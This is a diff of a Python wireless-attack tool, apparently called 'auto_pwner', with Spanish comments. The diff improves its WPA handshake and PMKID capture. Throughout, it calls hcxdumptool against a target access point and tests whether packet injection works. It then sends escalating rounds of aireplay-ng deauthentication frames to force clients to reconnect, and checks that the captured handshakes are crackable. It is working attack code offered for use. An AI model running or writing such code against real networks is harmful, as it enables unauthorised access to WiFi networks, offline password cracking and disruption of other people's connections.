@@ -526,15 +526,16 @@ def verify_handshake(cap_file):
         cap_file = cap_file + "-01.cap"
     if not os.path.exists(cap_file):
         return False, cap_file
-    # Verificación primaria: aircrack-ng reporta "handshake" explícitamente
-    r = run(f"aircrack-ng {cap_file} 2>&1", capture=True) or ""
-    if "handshake" in r.lower() and "no eapol" not in r.lower():
+    # Verificación primaria con aircrack-ng:
+    # aircrack imprime "WPA (0 handshake)" cuando NO hay — buscar N > 0
+    r = run(f"aircrack-ng {cap_file} 2>/dev/null", capture=True) or ""
+    m = re.search(r'\((\d+)\s+handshake', r, re.IGNORECASE)
+    if m and int(m.group(1)) > 0:
         return True, cap_file
-    # Verificación con hcxpcapngtool: limpiar residuo antes de testear
+    # Verificación con hcxpcapngtool: única fuente de verdad si aircrack falla
     if check_tool("hcxpcapngtool"):
         run("rm -f /tmp/_hs_test.hc22000 2>/dev/null")
-        out = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>&1", capture=True) or ""
-        # Rechazar si hcxpcapngtool reporta "no hashes written" explícitamente
+        out = run(f"hcxpcapngtool -o /tmp/_hs_test.hc22000 {cap_file} 2>/dev/null", capture=True) or ""
         if "no hashes written" in out.lower():
             run("rm -f /tmp/_hs_test.hc22000 2>/dev/null")
             return False, cap_file
@@ -4742,15 +4743,19 @@ def auto_pwner():
 
         # ── PMKID ─────────────────────────────────────────────────────────────
         if "PMKID" in vectors and check_tool("hcxdumptool"):
-            info("Vector: PMKID → capturando hash sin clientes...")
+            info("Vector: PMKID → capturando hash sin clientes (60s)...")
             os.makedirs("scan-output", exist_ok=True)
             pmkid_file = f"scan-output/auto_pmkid_{essid_s}.pcapng"
             hc_file    = f"scan-output/auto_pmkid_{essid_s}.hc22000"
             run(f"rm -f {pmkid_file} {hc_file} 2>/dev/null")
             _filter_f = f"/tmp/hcx_filter_{bssid.replace(':','')}.txt"
             with open(_filter_f, "w") as _ff: _ff.write(bssid.upper() + "\n")
-            _hcx_proc = subprocess.Popen(f"timeout 30 hcxdumptool -i {interfaz} -o {pmkid_file} --filterlist_ap={_filter_f} --filtermode=2 --active_beacon 2>/dev/null", shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            progress_bar(30, f"PMKID de {essid}")
+            _hcx_proc = subprocess.Popen(
+                f"hcxdumptool -i {interfaz} -o {pmkid_file} "
+                f"--filterlist_ap={_filter_f} --filtermode=2 --active_beacon 2>/dev/null",
+                shell=True, stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            progress_bar(60, f"PMKID de {essid}")
             _hcx_proc.terminate()
             _hcx_proc.wait()
             if os.path.exists(pmkid_file) and check_tool("hcxpcapngtool"):
@@ -4797,15 +4802,23 @@ def auto_pwner():
                 shell=True,
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                 stdin=subprocess.DEVNULL)
-            info("  → Capturando tráfico (10s antes de deauth)...")
-            time.sleep(10)
-            info("  → Enviando deauth para forzar reconexión...")
-            run(f"aireplay-ng -0 10 -a {bssid} {interfaz} 2>/dev/null")
-            time.sleep(3)
-            run(f"aireplay-ng -0 10 -a {bssid} {interfaz} 2>/dev/null")
-            time.sleep(3)
-            run(f"aireplay-ng -0 20 -a {bssid} {interfaz} 2>/dev/null")
-            time.sleep(5)
+            info("  → Capturando tráfico (15s antes de deauth)...")
+            time.sleep(15)
+            # Verificar si aireplay puede inyectar en este AP
+            info("  → Verificando capacidad de inyección...")
+            test_out = run(f"aireplay-ng -0 1 -a {bssid} {interfaz} 2>&1", capture=True) or ""
+            if "no such bssid" in test_out.lower():
+                warn("  → Inyección no disponible (AP fuera de rango de inyección).")
+                info("  → Esperando handshake natural (60s)... acerque el adaptador al AP.")
+                time.sleep(60)
+            else:
+                info("  → Inyección disponible. Enviando deauth en 3 rondas...")
+                run(f"aireplay-ng -0 10 -a {bssid} {interfaz} >/dev/null 2>&1")
+                time.sleep(4)
+                run(f"aireplay-ng -0 15 -a {bssid} {interfaz} >/dev/null 2>&1")
+                time.sleep(4)
+                run(f"aireplay-ng -0 25 -a {bssid} {interfaz} >/dev/null 2>&1")
+                time.sleep(6)
             cap_p.terminate()
             cap_p.wait()
 
